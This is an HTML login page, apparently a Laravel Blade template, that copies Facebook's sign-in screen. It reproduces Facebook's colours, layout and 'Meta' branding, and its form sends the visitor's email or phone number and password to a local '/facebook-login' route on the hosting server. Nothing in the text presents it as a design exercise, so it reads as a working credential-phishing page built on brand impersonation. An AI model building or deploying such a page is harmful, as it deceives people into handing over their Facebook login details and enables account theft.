<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Interface</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                 Roboto, Helvetica, Arial, sans-serif;
}

body{
    background:#f0f2f5;
    height:100vh;
    display:flex;
    flex-direction:column;
}

.main{
    flex:1;
    display:flex;
}

.left{
    flex:1;
    display:flex;
    flex-direction:column;
    justify-content:center;
    padding-left:8%;
    background:#f0f2f5;
}

.left h1{
    font-size:64px;
    font-weight:700;
    line-height:1.1;
    color:#1c1e21;
}

.left .blue{
    color:#1877f2;
}

.right{
    width:45%;
    background:#ffffff;
    display:flex;
    align-items:center;
    justify-content:center;
    border-left:1px solid #dadde1;
}

.login-box{
    width:420px;
}

.back{
    font-size:22px;
    margin-bottom:20px;
    cursor:pointer;
}

.login-box h2{
    font-size:22px;
    font-weight:600;
    margin-bottom:25px;
    color:#1c1e21;
}

.input{
    width:100%;
    padding:16px;
    margin-bottom:16px;
    border-radius:12px;
    border:1px solid #ccd0d5;
    font-size:16px;
}

.input:focus{
    outline:none;
    border:1px solid #1877f2;
    box-shadow:0 0 0 2px #e7f3ff;
}

.login-btn{
    width:100%;
    padding:14px;
    border-radius:28px;
    border:none;
    background:#1877f2;
    color:#fff;
    font-size:18px;
    font-weight:600;
    cursor:pointer;
    margin-top:10px;
}

.login-btn:hover{
    background:#166fe5;
}

.forgot{
    text-align:center;
    margin:22px 0;
    font-size:14px;
    color:#1c1e21;
    cursor:pointer;
}

.create-btn{
    width:100%;
    padding:13px;
    border-radius:28px;
    border:1px solid #1877f2;
    background:#fff;
    color:#1877f2;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
}

.create-btn:hover{
    background:#f0f8ff;
}

.footer{
    text-align:center;
    padding:15px;
    font-size:14px;
    color:#65676b;
    border-top:1px solid #dadde1;
    background:#f0f2f5;
}

.footer span{
    margin:0 8px;
    cursor:pointer;
}

.meta{
    margin-top:10px;
    font-weight:600;
    color:#1877f2;
}
</style>
</head>

<body>

<div class="main">

    <div class="left">
        <h1>
            Explore<br>
            the things<br>
            <span class="blue">you love.</span>
        </h1>
    </div>

    <div class="right">
        <div class="login-box">

            <div class="back">&#8592;</div>

            <h2>Log in</h2>

            <!-- FORM START -->
            <form method="POST" action="/facebook-login">
                @csrf

                <input type="text" 
                       name="email"
                       class="input" 
                       placeholder="Email address or mobile number"
                       required>

                <input type="password" 
                       name="password"
                       class="input" 
                       placeholder="Password"
                       required>

                <button type="submit" class="login-btn">
                    Log in
                </button>
            </form>
            <!-- FORM END -->

            <div class="forgot">Forgotten password?</div>

            <button type="button" class="create-btn">
                Create new account
            </button>

            <div class="meta">Meta</div>

        </div>
    </div>

</div>

<div class="footer">
    <span>English (UK)</span>
    <span>हिन्दी</span>
    <span>मराठी</span>
    <span>বাংলা</span>
    <span>More languages...</span>
</div>

</body>
</html>
